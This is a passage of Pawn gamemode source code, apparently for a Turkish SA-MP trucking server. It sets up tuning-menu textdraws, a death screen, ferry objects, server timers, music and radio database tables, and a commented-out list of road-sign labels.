	wTuning2[4] = TextDrawCreate(88.000000, 233.000000, "Classic________________");
	TextDrawBackgroundColor(wTuning2[4], 255);
	TextDrawFont(wTuning2[4], 2);
	TextDrawLetterSize(wTuning2[4], 0.300000, 1.000000);
	TextDrawColor(wTuning2[4], -1);
	TextDrawSetOutline(wTuning2[4], 0);
	TextDrawSetProportional(wTuning2[4], 1);
	TextDrawSetShadow(wTuning2[4], 0);
	TextDrawUseBox(wTuning2[4], 1);
	TextDrawBoxColor(wTuning2[4], 0);
	TextDrawTextSize(wTuning2[4], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning2[4], 0);

	wTuning2[5] = TextDrawCreate(87.000000, 254.000000, "Twist____________________");
	TextDrawBackgroundColor(wTuning2[5], 255);
	TextDrawFont(wTuning2[5], 2);
	TextDrawLetterSize(wTuning2[5], 0.300000, 1.000000);
	TextDrawColor(wTuning2[5], -1);
	TextDrawSetOutline(wTuning2[5], 0);
	TextDrawSetProportional(wTuning2[5], 1);
	TextDrawSetShadow(wTuning2[5], 0);
	TextDrawUseBox(wTuning2[5], 1);
	TextDrawBoxColor(wTuning2[5], 0);
	TextDrawTextSize(wTuning2[5], 180.000000, 10.000000);
	TextDrawSetSelectable(wTuning2[5], 0);

	wTuning2[6] = TextDrawCreate(87.000000, 275.000000, "Cutter_________________");
	TextDrawBackgroundColor(wTuning2[6], 255);
	TextDrawFont(wTuning2[6], 2);
	TextDrawLetterSize(wTuning2[6], 0.300000, 1.000000);
	TextDrawColor(wTuning2[6], -1);
	TextDrawSetOutline(wTuning2[6], 0);
	TextDrawSetProportional(wTuning2[6], 1);
	TextDrawSetShadow(wTuning2[6], 0);
	TextDrawUseBox(wTuning2[6], 1);
	TextDrawBoxColor(wTuning2[6], 0);
	TextDrawTextSize(wTuning2[6], 180.000000, 10.000000);
	TextDrawSetSelectable(wTuning2[6], 0);

	wTuning2[7] = TextDrawCreate(87.000000, 293.000000, "Dollar_________________");
	TextDrawBackgroundColor(wTuning2[7], 255);
	TextDrawFont(wTuning2[7], 2);
	TextDrawLetterSize(wTuning2[7], 0.300000, 1.000000);
	TextDrawColor(wTuning2[7], -1);
	TextDrawSetOutline(wTuning2[7], 0);
	TextDrawSetProportional(wTuning2[7], 1);
	TextDrawSetShadow(wTuning2[7], 0);
	TextDrawUseBox(wTuning2[7], 1);
	TextDrawBoxColor(wTuning2[7], 0);
	TextDrawTextSize(wTuning2[7], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning2[7], 0);

	wTuning2[8] = TextDrawCreate(87.000000, 312.000000, "Atomic__________________");
	TextDrawBackgroundColor(wTuning2[8], 255);
	TextDrawFont(wTuning2[8], 2);
	TextDrawLetterSize(wTuning2[8], 0.300000, 1.000000);
	TextDrawColor(wTuning2[8], -1);
	TextDrawSetOutline(wTuning2[8], 0);
	TextDrawSetProportional(wTuning2[8], 1);
	TextDrawSetShadow(wTuning2[8], 0);
	TextDrawUseBox(wTuning2[8], 1);
	TextDrawBoxColor(wTuning2[8], 0);
	TextDrawTextSize(wTuning2[8], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning2[8], 0);
	//------------------------------------------------------------------------------
	//
	//
	//------------------------------------------------------------------------------
	wTuning3[0] = TextDrawCreate(88.000000, 149.000000, "MAVI");
	TextDrawBackgroundColor(wTuning3[0], 255);
	TextDrawFont(wTuning3[0], 2);
	TextDrawLetterSize(wTuning3[0], 0.300000, 1.000000);
	TextDrawColor(wTuning3[0], -1);
	TextDrawSetOutline(wTuning3[0], 0);
	TextDrawSetProportional(wTuning3[0], 1);
	TextDrawSetShadow(wTuning3[0], 0);
	TextDrawUseBox(wTuning3[0], 1);
	TextDrawBoxColor(wTuning3[0], 0);
	TextDrawTextSize(wTuning3[0], 190.000000, 10.000000);
	TextDrawSetSelectable(wTuning3[0], 0);

	wTuning3[1] = TextDrawCreate(88.000000, 168.000000, "SARI");
	TextDrawBackgroundColor(wTuning3[1], 255);
	TextDrawFont(wTuning3[1], 2);
	TextDrawLetterSize(wTuning3[1], 0.300000, 1.000000);
	TextDrawColor(wTuning3[1], -1);
	TextDrawSetOutline(wTuning3[1], 0);
	TextDrawSetProportional(wTuning3[1], 1);
	TextDrawSetShadow(wTuning3[1], 0);
	TextDrawUseBox(wTuning3[1], 1);
	TextDrawBoxColor(wTuning3[1], 0);
	TextDrawTextSize(wTuning3[1], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning3[1], 0);

	wTuning3[2] = TextDrawCreate(88.000000, 190.000000, "BEYAZ");
	TextDrawBackgroundColor(wTuning3[2], 255);
	TextDrawFont(wTuning3[2], 2);
	TextDrawLetterSize(wTuning3[2], 0.300000, 1.000000);
	TextDrawColor(wTuning3[2], -1);
	TextDrawSetOutline(wTuning3[2], 0);
	TextDrawSetProportional(wTuning3[2], 1);
	TextDrawSetShadow(wTuning3[2], 0);
	TextDrawUseBox(wTuning3[2], 1);
	TextDrawBoxColor(wTuning3[2], 0);
	TextDrawTextSize(wTuning3[2], 171.000000, 10.000000);
	TextDrawSetSelectable(wTuning3[2], 0);

	wTuning3[3] = TextDrawCreate(88.000000, 213.000000, "KIRMIZI");
	TextDrawBackgroundColor(wTuning3[3], 255);
	TextDrawFont(wTuning3[3], 2);
	TextDrawLetterSize(wTuning3[3], 0.300000, 1.000000);
	TextDrawColor(wTuning3[3], -1);
	TextDrawSetOutline(wTuning3[3], 0);
	TextDrawSetProportional(wTuning3[3], 1);
	TextDrawSetShadow(wTuning3[3], 0);
	TextDrawUseBox(wTuning3[3], 1);
	TextDrawBoxColor(wTuning3[3], 0);
	TextDrawTextSize(wTuning3[3], 171.000000, 10.000000);
	TextDrawSetSelectable(wTuning3[3], 0);

	wTuning3[4] = TextDrawCreate(88.000000, 233.000000, "YESIL");
	TextDrawBackgroundColor(wTuning3[4], 255);
	TextDrawFont(wTuning3[4], 2);
	TextDrawLetterSize(wTuning3[4], 0.300000, 1.000000);
	TextDrawColor(wTuning3[4], -1);
	TextDrawSetOutline(wTuning3[4], 0);
	TextDrawSetProportional(wTuning3[4], 1);
	TextDrawSetShadow(wTuning3[4], 0);
	TextDrawUseBox(wTuning3[4], 1);
	TextDrawBoxColor(wTuning3[4], 0);
	TextDrawTextSize(wTuning3[4], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning3[4], 0);

	wTuning3[5] = TextDrawCreate(88.000000, 252.000000, "remove_neon");
	TextDrawBackgroundColor(wTuning3[5], 255);
	TextDrawFont(wTuning3[5], 2);
	TextDrawLetterSize(wTuning3[5], 0.300000, 1.000000);
	TextDrawColor(wTuning3[5], -1);
	TextDrawSetOutline(wTuning3[5], 0);
	TextDrawSetProportional(wTuning3[5], 1);
	TextDrawSetShadow(wTuning3[5], 0);
	TextDrawUseBox(wTuning3[5], 1);
	TextDrawBoxColor(wTuning3[5], 0);
	TextDrawTextSize(wTuning3[5], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning3[5], 0);
	//------------------------------------------------------------------------------
	//
	//
	//------------------------------------------------------------------------------
	wTuning4[0] = TextDrawCreate(88.000000, 149.000000, "PAINTJOB_1");
	TextDrawBackgroundColor(wTuning4[0], 255);
	TextDrawFont(wTuning4[0], 2);
	TextDrawLetterSize(wTuning4[0], 0.300000, 1.000000);
	TextDrawColor(wTuning4[0], -1);
	TextDrawSetOutline(wTuning4[0], 0);
	TextDrawSetProportional(wTuning4[0], 1);
	TextDrawSetShadow(wTuning4[0], 0);
	TextDrawUseBox(wTuning4[0], 1);
	TextDrawBoxColor(wTuning4[0], 0);
	TextDrawTextSize(wTuning4[0], 190.000000, 10.000000);
	TextDrawSetSelectable(wTuning4[0], 0);

	wTuning4[1] = TextDrawCreate(88.000000, 168.000000, "PaintJob_2");
	TextDrawBackgroundColor(wTuning4[1], 255);
	TextDrawFont(wTuning4[1], 2);
	TextDrawLetterSize(wTuning4[1], 0.300000, 1.000000);
	TextDrawColor(wTuning4[1], -1);
	TextDrawSetOutline(wTuning4[1], 0);
	TextDrawSetProportional(wTuning4[1], 1);
	TextDrawSetShadow(wTuning4[1], 0);
	TextDrawUseBox(wTuning4[1], 1);
	TextDrawBoxColor(wTuning4[1], 0);
	TextDrawTextSize(wTuning4[1], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning4[1], 0);

	wTuning4[2] = TextDrawCreate(88.000000, 190.000000, "PaintJob_3");
	TextDrawBackgroundColor(wTuning4[2], 255);
	TextDrawFont(wTuning4[2], 2);
	TextDrawLetterSize(wTuning4[2], 0.300000, 1.000000);
	TextDrawColor(wTuning4[2], -1);
	TextDrawSetOutline(wTuning4[2], 0);
	TextDrawSetProportional(wTuning4[2], 1);
	TextDrawSetShadow(wTuning4[2], 0);
	TextDrawUseBox(wTuning4[2], 1);
	TextDrawBoxColor(wTuning4[2], 0);
	TextDrawTextSize(wTuning4[2], 171.000000, 10.000000);
	TextDrawSetSelectable(wTuning4[2], 0);
	//------------------------------------------------------------------------------
	//
	//
	//------------------------------------------------------------------------------
	wTuning5[0] = TextDrawCreate(88.000000, 149.000000, "VIP - Nitro 2X");
	TextDrawBackgroundColor(wTuning5[0], 255);
	TextDrawFont(wTuning5[0], 2);
	TextDrawLetterSize(wTuning5[0], 0.300000, 1.000000);
	TextDrawColor(wTuning5[0], -1);
	TextDrawSetOutline(wTuning5[0], 0);
	TextDrawSetProportional(wTuning5[0], 1);
	TextDrawSetShadow(wTuning5[0], 0);
	TextDrawUseBox(wTuning5[0], 1);
	TextDrawBoxColor(wTuning5[0], 0);
	TextDrawTextSize(wTuning5[0], 190.000000, 10.000000);
	TextDrawSetSelectable(wTuning5[0], 0);

	wTuning5[1] = TextDrawCreate(88.000000, 169.000000, "VIP - Nitro 5x");
	TextDrawBackgroundColor(wTuning5[1], 255);
	TextDrawFont(wTuning5[1], 2);
	TextDrawLetterSize(wTuning5[1], 0.300000, 1.000000);
	TextDrawColor(wTuning5[1], -1);
	TextDrawSetOutline(wTuning5[1], 0);
	TextDrawSetProportional(wTuning5[1], 1);
	TextDrawSetShadow(wTuning5[1], 0);
	TextDrawUseBox(wTuning5[1], 1);
	TextDrawBoxColor(wTuning5[1], 0);
	TextDrawTextSize(wTuning5[1], 170.000000, 10.000000);
	TextDrawSetSelectable(wTuning5[1], 0);

	wTuning5[2] = TextDrawCreate(88.000000, 190.000000, "VIP - Nitro 10x");
	TextDrawBackgroundColor(wTuning5[2], 255);
	TextDrawFont(wTuning5[2], 2);
	TextDrawLetterSize(wTuning5[2], 0.300000, 1.000000);
	TextDrawColor(wTuning5[2], -1);
	TextDrawSetOutline(wTuning5[2], 0);
	TextDrawSetProportional(wTuning5[2], 1);
	TextDrawSetShadow(wTuning5[2], 0);
	TextDrawUseBox(wTuning5[2], 1);
	TextDrawBoxColor(wTuning5[2], 0);
	TextDrawTextSize(wTuning5[2], 171.000000, 10.000000);
	TextDrawSetSelectable(wTuning5[2], 0);


	for(new i = 5; i < sizeof(wTuning1); i++) { TextDrawSetSelectable(Text:wTuning1[i], true); }
	for(new i = 0; i < sizeof(wTuning2); i++) { TextDrawSetSelectable(Text:wTuning2[i], true); }
	for(new i = 0; i < sizeof(wTuning3); i++) { TextDrawSetSelectable(Text:wTuning3[i], true); }
	for(new i = 0; i < sizeof(wTuning4); i++) { TextDrawSetSelectable(Text:wTuning4[i], true); }
	for(new i = 0; i < sizeof(wTuning5); i++) { TextDrawSetSelectable(Text:wTuning5[i], true); }

	print(" ' Wtuning v2 ' Yuklendi");

	//vites sistemi

	print("' Vites Sistemi ' Yuklendi");

    // === Building and Wather Fireman ======
    CreateDynamicObject(11008, 1099.30066, -1261.38281, 20.22270,   0.00000, -6.00000, 90.00000);// casa la job Pompier
    CreateDynamicObject(3255, 1099.55139, -1185.04590, 17.02541,   0.00000, 0.00000, 270.48352);
    CreateDynamicObject(3643, 1099.36389, -1189.03284, 25.69979,   0.00000, 0.00000, 0.00000);

	//öldün textdrawn


	TDEditor_TD[0] = TextDrawCreate(-117.333343, -119.192596, "ld_spac:black");
	TextDrawLetterSize(TDEditor_TD[0], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_TD[0], 914.333129, 783.984985);
	TextDrawAlignment(TDEditor_TD[0], 1);
	TextDrawColor(TDEditor_TD[0], -186);
	TextDrawSetShadow(TDEditor_TD[0], 0);
	TextDrawSetOutline(TDEditor_TD[0], 0);
	TextDrawBackgroundColor(TDEditor_TD[0], 255);
	TextDrawFont(TDEditor_TD[0], 4);
	TextDrawSetProportional(TDEditor_TD[0], 0);
	TextDrawSetShadow(TDEditor_TD[0], 0);

	TDEditor_TD[1] = TextDrawCreate(320.000000, 190.000000, "WASTED");
	TextDrawLetterSize(TDEditor_TD[1], 0.730997, 3.043555);
	TextDrawAlignment(TDEditor_TD[1], 2);
	TextDrawColor(TDEditor_TD[1], -76);
	TextDrawSetShadow(TDEditor_TD[1], 0);
	TextDrawSetOutline(TDEditor_TD[1], 0);
	TextDrawBackgroundColor(TDEditor_TD[1], 255);
	TextDrawFont(TDEditor_TD[1], 3);
	TextDrawSetProportional(TDEditor_TD[1], 1);
	TextDrawSetShadow(TDEditor_TD[1], 0);

	TDEditor_TD[2] = TextDrawCreate(-17.666658, 165.300109, "");
	TextDrawLetterSize(TDEditor_TD[2], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_TD[2], 668.000061, 86.266624);
	TextDrawAlignment(TDEditor_TD[2], 1);
	TextDrawColor(TDEditor_TD[2], 140);
	TextDrawSetShadow(TDEditor_TD[2], 0);
	TextDrawSetOutline(TDEditor_TD[2], 0);
	TextDrawBackgroundColor(TDEditor_TD[2], 0);
	TextDrawFont(TDEditor_TD[2], 5);
	TextDrawSetProportional(TDEditor_TD[2], 0);
	TextDrawSetShadow(TDEditor_TD[2], 0);
	TextDrawSetPreviewModel(TDEditor_TD[2], 19454);
	TextDrawSetPreviewRot(TDEditor_TD[2], 0.000000, 0.000000, 70.000000, 0.375391);

	// Rekor Ölçüm Sistemi
	new RekorFileName[50];
	format(RekorFileName, 50, "ServerData/Rekor.ini");

	INI_ParseFile(RekorFileName, "LoadRekor");

	// Start the timer that will show timed messages every 2 minutes
	SetTimer("Timer_TimedMessages", 1000 * 60 * 2, true);
	// Start the timer that will show a random bonus mission for truckers every 5 minutes
	SetTimer("ShowRandomBonusMission", 1000 * 60 * 5, true);
	// Start the timer that checks the toll-gates
	SetTimer("Toll", 1000, true);
	
	// Þirket Sistemi
	SetTimer("SirketKapiControl", 1000, true);

	// Ýþyeri Sistemi
	SetTimer("BusinessTransactionVer", 3600000, true);
	
	// Fix the bugged houses (after fixing the houses, you can remove this line, as it's not needed anymore) eski ev sistemi
	//FixHouses();

	// While the gamemode starts, start the global timer, and run it every second
	SetTimer("GlobalTimer", 1000, true);
    SetTimer("GlobalTimer100ms", 100, true);

	// Load the auto-evict-time and start the auto-evict timer (it runs every minute)
	//AutoEvict_Load();
	SetTimer("AutoEvictTimer", 60 * 1000, true);

	//Lotto Sistemi
	SetTimer("Lotto",LOTTO_SURE,true);

	// Metin ile Sabah Sabah Delirmeceler
	LoadCezaOdemeYerleri();

	//Etkinlik Sistemi
	for(new i = 0; i < _: e_Event; ++i) {
		g_iEvent[e_Event: i] = _: 0;
	}

	// Giþe Sistemi
	LoadTollGates();

	// Þirket Sistemi
	LoadSirkets();
	for(new i; i < MAX_VEHICLES; i++)
	{
		ArabaSirket[i] = -1;
		// Saklý Kasa Sistemi Sýzdý
		TrailerSakliKasa[i] = -1;
	}
	LoadSirketArabas();
	SirketDolumControl();
	SetTimer("SirketDolumControl", 3600 * 1000, true);

	for(new i; i < MAX_VEHICLES; i++)
	{
	    	VehicleIsLocked[i] = 0;
	    	AVehicleData[i][VehicleText] = Text3D:-1;
	}

	for(new i; i < MAX_PLAYERS; i++)
	{
		girisSure[i] = -1;
	}

	// TMMobile Sistemi
    if(!SQL::ExistsTable("muzikler"))
    {
        handle = SQL::Open(SQL::CREATE, "muzikler");
        SQL::AddTableColumn(handle, "ID", SQL_TYPE_INT, 11, true);
        SQL::AddTableColumn(handle, "Isim", SQL_TYPE_VCHAR, 100);
        SQL::AddTableColumn(handle, "URL", SQL_TYPE_VCHAR, 256);
        SQL::AddTableColumn(handle, "Ekleyen", SQL_TYPE_VCHAR, 50);
        SQL::AddTableColumn(handle, "Dinlenme", SQL_TYPE_INT, 11);
		SQL::Close(handle);

        printf("'muzikler' tablosu olusturuldu.");
    }

    if(!SQL::ExistsTable("radyolar"))
    {
        handle = SQL::Open(SQL::CREATE, "radyolar");
        SQL::AddTableColumn(handle, "ID", SQL_TYPE_INT, 11, true);
        SQL::AddTableColumn(handle, "Isim", SQL_TYPE_VCHAR, 100);
        SQL::AddTableColumn(handle, "URL", SQL_TYPE_VCHAR, 256);
        SQL::AddTableColumn(handle, "Ekleyen", SQL_TYPE_VCHAR, 50);
        SQL::AddTableColumn(handle, "Dinlenme", SQL_TYPE_INT, 11);
        SQL::Close(handle);

        printf("'radyolar' tablosu olusturuldu.");
    }

	format(CalanMP3Name, 100, "-");
	format(CalanMP3URL, 300, "-");
	CalanMP3ID = -1;
	/*
	ESKÝ SÝSTEM
	MP3Yukle();
	RadYukle();*/



	// Saklý Kasa Sistemi
	LoadSakliKasa();

	// Ferry Sistemi
    SetTimer("FerryIS", 240000, true);
    ferry = CreateObject(10771, 2650.21191, -2291.62915, -0.03891,   0.00000, 0.00000, 0.00000);
	FerryObject[0] = CreateObject(10770, 2653.45239, -2299.15625, 33.11850,   0.00000, 0.00000, 0.00000);
    FerryObject[1] = CreateObject(3115, 2551.23779, -2291.54199, 11.43030,   0.00000, 0.00000, 0.00000);
    FerryObject[2] = CreateObject(3114, 2593.44946, -2279.50488, 11.10060,   0.00000, 0.00000, 0.00000);
    FerryObject[3] = CreateObject(3113, 2541.05908, -2291.58105, -0.43180,   0.00000, 0.00000, 0.00000);
    FerryObject[4] = CreateObject(11237, 2653.42407, -2299.16797, 33.07820,   0.00000, 0.00000, 0.00000);
    FerryObject[5] = CreateObject(982, 2737.92529, -2304.55811, 12.18130,   0.00000, 0.00000, 269.98810);
    FerryObject[6] = CreateObject(982, 2738.54590, -2278.74390, 12.18130,   0.00000, 0.00000, 269.96811);
    FerryObject[7] = CreateObject(982, 2579.17554, -2304.55566, 12.18130,   0.00000, 0.00000, 269.98810);
    FerryObject[8] = CreateObject(982, 2604.79248, -2304.57153, 12.18130,   0.00000, 0.00000, 269.98810);
    FerryObject[9] = CreateObject(982, 2630.41089, -2304.57861, 12.18130,   0.00000, 0.00000, 269.98810);
    FerryObject[10] = CreateObject(982, 2699.49683, -2304.55591, 12.18130,   0.00000, 0.00000, 269.98810);
    FerryObject[11] = CreateObject(982, 2725.11450, -2304.56787, 12.18130,   0.00000, 0.00000, 269.98810);
    FerryObject[12] = CreateObject(982, 2553.57861, -2304.57202, 12.18130,   0.00000, 0.00000, 269.96811);
    FerryObject[13] = CreateObject(982, 2553.48291, -2278.68335, 12.18130,   0.00000, 0.00000, 269.96811);
    FerryObject[14] = CreateObject(982, 2571.09448, -2278.69165, 12.18130,   0.00000, 0.00000, 269.96811);
    FerryObject[15] = CreateObject(982, 2616.88354, -2278.68091, 12.18130,   0.00000, 0.00000, 269.96811);
    FerryObject[16] = CreateObject(982, 2642.50684, -2278.68872, 12.18130,   0.00000, 0.00000, 269.96811);
    FerryObject[17] = CreateObject(982, 2668.10840, -2278.70776, 12.18130,   0.00000, 0.00000, 269.96811);
    FerryObject[18] = CreateObject(982, 2693.72607, -2278.71411, 12.18130,   0.00000, 0.00000, 269.96811);
    FerryObject[19] = CreateObject(982, 2719.34570, -2278.73071, 12.18130,   0.00000, 0.00000, 269.96811);
    FerryObject[20] = CreateObject(984, 2540.73901, -2285.06348, 12.11590,   0.00000, 0.00000, 0.00000);
    FerryObject[21] = CreateObject(984, 2540.75684, -2298.14844, 12.11590,   0.00000, 0.00000, 0.00000);
    FerryObject[22] = CreateObject(2944, 2642.11792, -2278.73169, 6.24590,   0.00000, 0.00000, -90.00000);
    FerryObject[23] = CreateObject(2944, 2660.75854, -2293.67480, 13.19060,   0.00000, 0.00000, -90.00000);
    FerryObject[24] = CreateObject(3294, 2586.31860, -2277.31201, 6.43400,   0.00000, 0.00000, 89.22000);
    FerryObject[25] = CreateObject(3294, 2683.50342, -2277.63574, 6.91400,   0.00000, 0.00000, 89.00000);
    FerryObject[26] = CreateObject(3294, 2600.55542, -2277.50562, 6.43400,   0.00000, 0.00000, 89.22000);
    FerryObject[27] = CreateObject(3294, 2593.41943, -2277.41919, 6.43400,   0.00000, 0.00000, 89.22000);
    FerryObject[28] = CreateObject(3294, 2672.87451, -2305.52734, 6.60470,   0.00000, 0.00000, 89.88000);

	//tabela sistemi
	/*
	Create3DTextLabel("Yavaslayýniýz!!",0x8B0000FF,1040.688842, -1929.155273, 13.130970,80,0); //ls roadwork
    Create3DTextLabel(" Dikkat  Tümsekler!",0xFFFF00AA,988.182800, -2045.571166, 13.740249,40,0); //ls roadwork
    Create3DTextLabel("Tunel Coktu !!Yavasla",0x8B0000FF,1137.302368, -2376.745117, 11.497949,70,0); //ls roadwork
    Create3DTextLabel("Dikkat Tumsekler!",0xFFFF00AA,1014.895019, -2247.546630, 13.317857,40,0); //ls roadwork
    Create3DTextLabel("Las Venturas'a Hoþgeldiniz!!",0x006400FF,1457.000000, 978.981872, 10.820312,30,0);
    Create3DTextLabel("Fallen Tree'e Hoþgeldiniz!!",0x006400FF,-525.000000, -500.061645, 25.523437,30,0);
    Create3DTextLabel("Countryside'a Hoþgeldiniz!!",0x006400FF,-79.036224, -1134.472045, 1.078125,30,0);
    Create3DTextLabel("San Fierro'ya Hoþgeldiniz!!",0x006400FF,-2132.195800, -247.500000, 35.320312,30,0);
    Create3DTextLabel("Los Santos'a Hoþgeldiniz!!",0x006400FF,1770.337402, -2040.699951, 13.528096,30,0);
    Create3DTextLabel("Mountains'e Hoþgeldiniz!!",0x006400FF,-545.270690, 2594.000000, 53.515625,30,0);
    Create3DTextLabel("Quarry'e Hoþgeldiniz!!",0x006400FF,332.736816, 898.460388, 25.039310,30,0);
    Create3DTextLabel("Highway'e Hoþgeldiniz!!",0x006400FF,-1577.746215, -2722.707275, 48.539062,30,0); //bis hier spawnloacaiotns
    Create3DTextLabel("Seridinizi Koruyun!",0xFFFF00AA,1712.587402, 842.680786, 9.431028,70,0);
    Create3DTextLabel("Seridinizi Koruyun!",0xFFFF00AA,1941.495727, 843.017272, 7.687500,70,0);
    Create3DTextLabel("Radar Limitlerine Uyunuz!!",0xB8860BFF,1711.135864, 497.639404, 29.674699,80,0);
    Create3DTextLabel("Benziniz mi yok ? /asistan ",0x33AA33AA,1649.550415, -243.100189, 38.063907,70,0);
    Create3DTextLabel("VIP AREA",0x006400FF,3154.682128, -1868.373779, 12.581388,40,0);
    Create3DTextLabel("Parking Fiveteen Dollar",0x2F4F4FFF,3280.136230, -1928.390625, 3.205375,60,0);
    Create3DTextLabel("Feribotu Burda Bekleyiniz",0xFFFF00FF,2544.052490, -2232.446533, 14.331849,100,0);
    Create3DTextLabel("DUR",0xFF0000FF,2544.060058, -2232.348632, 14.832282,100,0);
    Create3DTextLabel("To Muroland",0xFFFF00FF,220.084503, 2760.813476, 64.681854,50,0);
    Create3DTextLabel("<Las Venturas",0x03B8FCFF,0xFFFF00FF, 2763.922363, 65.495712,30,0);
    Create3DTextLabel(">> Muroland Warehouse >>",0xFFFF00FF,-175.507614, 5526.276855, 11.848629,80,0);
    Create3DTextLabel("Muroland Refinery",0xFFFF00FF,-180.536315, 5524.999511, 11.868745,80,0);
    Create3DTextLabel("<< Los Santos",0xFFFF00FF,2857.636474, -303.645385, 15.131125,40,0);
    Create3DTextLabel(">> Las.Venturas",0xFFFF00FF,2857.921142, -296.383605, 15.219573,40,0);
    Create3DTextLabel("Warehouse Refinery",0xFFFF00FF,4627.740722, -381.919799, 9.142430,50,0);
    Create3DTextLabel("To Bone Country",0xFFFF00FF,4640.901367, -372.329040, 9.182409,60,0);
    Create3DTextLabel("Istanbul.City Izmir.City Sosyete Island Mavi Sehir",0xFFFF00FF,823.341918, -1792.431152, 19.998826,80,0);
	Create3DTextLabel("Los Santos",0xFFFF00FF,837.066284, -1793.723510, 20.062667,60,0);
    Create3DTextLabel("Istanbul City",0xFFFF00FF,654.828918, -2995.481933, 20.039600,90,0);
    Create3DTextLabel("Izmir City, Sosyete Sehir, Mavi Sehir",0xFFFF00FF,660.997375, -3000.350341, 19.839641,90,0);
    Create3DTextLabel("<<<<<<",0xFFFF00FF,660.782348, -3000.120361, 20.684169,90,0);
    Create3DTextLabel("Sosyete City",0xFFFF00FF,1162.228149, -3431.245361, 14.602092,80,0);
    Create3DTextLabel("Izmir City",0xFFFF00FF,1175.119262, -3398.219238, 14.702092,80,0);
    Create3DTextLabel("Mavi Sehir",0xFFFF00FF,1131.964233, -3418.149902, 14.702092,80,0);
    Create3DTextLabel("Los Santos, Istanbul City>>>>",0xFFFF00FF,1155.363159, -3381.138916, 14.702092,80,0);
    Create3DTextLabel("<<<<<Los Santos, Istanbul City",0xFFFF00FF,1147.790283, -3432.490722, 14.702092,80,0);
    Create3DTextLabel("Los Santos, Istanbul City",0xFFFF00FF,1177.626708, -3414.064941, 14.702092,80,0);
    Create3DTextLabel("Sosyete City, Izmir.City, Mavi.Sehir",0xFFFF00FF,652.907592, -3046.782714, 20.341056,90,0);
    Create3DTextLabel(">>>>>>>",0xFFFF00FF,652.840820, -3046.713378, 19.231271,90,0);
    Create3DTextLabel("Los Santos",0xFFFF00FF,647.063659, -3041.863769, 19.948692,90,0);
    Create3DTextLabel("Harbour Island",0xFFFF00FF,2134.946777, 2783.092529, 11.968227,100,0);
    Create3DTextLabel("Dikkatli Sürünüz",0xFF0000FF,2134.370605, 2839.041748, 12.061989,70,0);
    Create3DTextLabel(">>>Mejburi Saga Dönüs",0xFF0000FF,2135.970214, 4825.453125, 16.162092,200,0);
    Create3DTextLabel("Harbour Island",0xFFFF00FF,3269.303466, 4385.751464, 17.019367,100,0);
    Create3DTextLabel("Hosgeldiniz",0xFFFF00FF,3268.913818, 4379.840332, 17.461114,100,0);
    Create3DTextLabel("!!!Ileri Kavsakta Mejburi Sola Dönüs!!!",0xFF0000FF,3272.468017, 4400.025878, 16.929626,100,0);
    Create3DTextLabel("Mejburi Sola Dönüs",0xFF0000FF,2112.052978, 4811.404785, 11.587149,300,0);
    Create3DTextLabel("Las Venturas",0xFFFF00FF,2119.032470, 4786.256347, 16.162092,100,0);
    Create3DTextLabel("GIRIS YASAK",0xFF0000FF,4976.100097, -3280.123535, 16.825601,60,0);
 	Create3DTextLabel(">>>Tek Yön Mejburi Saga>>>",0xFF0000FF,4975.640136, -3260.710449, 16.623765,60,0);
 	Create3DTextLabel("Feriyi Burda Bekleyiniz",0xFF0000FF,3973.494140, -2276.250244, 14.582756,100,0);
 	Create3DTextLabel("Diver Island",0xFFFF00FF,2876.385498, 2650.658203, 18.421543,200,0);
 	Create3DTextLabel("Benzinlik >>>",0xFFFF00FF,4019.082275, 2764.185791, 14.149168,200,0);
 	Create3DTextLabel("Diver Chemicals",0xFFFF00FF,5198.243652, 2436.267089, 10.087548,150,0);
 	Create3DTextLabel("Diver Chemicals",0xFFFF00FF,5626.144042, 2617.924560, 16.724304,150,0);
 	Create3DTextLabel("Las Venturas",0xFFFF00FF,5634.371093, 2647.789550, 16.689052,150,0);
	Create3DTextLabel("Diver Island.Farm",0xFFFF00FF,5668.704589, 2653.169189, 16.954755,150,0);
 	Create3DTextLabel("Diver Constructions",0xFFFF00FF,6567.233398, 2091.793945, 15.277233,150,0);
 	Create3DTextLabel("Diver Constructions",0xFFFF00FF,5656.349609, 2621.523925, 16.437301,150,0);
 	Create3DTextLabel("Las Venturas",0xFFFF00FF,2877.802246, 2664.124511, 18.234418,150,0);
 	Create3DTextLabel("<<<.Longway Constructions",0xFFFF00FF,-2920.637939, -4482.514160, 57.207172,150,0);
 	Create3DTextLabel("<<<.Longway Constructions",0xFFFF00FF,-2892.205566, -4491.044433, 57.427577,150,0);
 	Create3DTextLabel(">>>Longway Warehouse",0xFFFF00FF,-2926.014648, -4478.388183, 57.358444,150,0);
 	Create3DTextLabel("Longway Warehouse",0xFFFF00FF,-2916.282958, -4450.624511, 57.189044,150,0);
 	Create3DTextLabel("Los Santos",0xFFFF00FF,-2885.154785, -4465.882324, 57.722545,150,0);
 	Create3DTextLabel("San Fierro",0xFFFF00FF,-2890.321533, -4461.707519, 58.077026,150,0);
 	Create3DTextLabel("Los Santos",0xFFFF00FF,-3827.713623, -5737.145996, 62.157833,150,0);
 	Create3DTextLabel("Longway Warehouse/Construction",0xFFFF00FF,-3832.399902, -5733.375000, 62.138011,150,0);
 	Create3DTextLabel("Longway Refinery",0xFFFF00FF,-3865.221191, -5746.448242, 61.975357,150,0);
 	Create3DTextLabel(">>Los Santos/Longway",0xFFFF00FF,-3819.736572, -5746.834960, 62.059211,150,0);
 	Create3DTextLabel("Longway Docks",0xFFFF00FF,-3824.383300, -5752.715820, 62.337303,150,0);
 	Create3DTextLabel("<<<Longway Docks",0xFFFF00FF,-3852.165771, -5758.888183, 62.067222,150,0);
 	Create3DTextLabel("Longway Giris",0xFFFF00FF,-1637.7885, -2755.2861, 54.7296,150,0);
 	Create3DTextLabel("Dikkatli Sürünüz !",0xFFFF00FF,-1643.0889, -2750.9553, 53.9617,150,0);
 	Create3DTextLabel(">> San Fierro Ehliyet Alma Yeri <<",0xFFFF00FF,-2032.9965, -96.9103, 35.1641,300,0);
 	//Create3DTextLabel("HGS",0xFFFF00FF,526.9991, 699.1654, 8.8959,300,0);
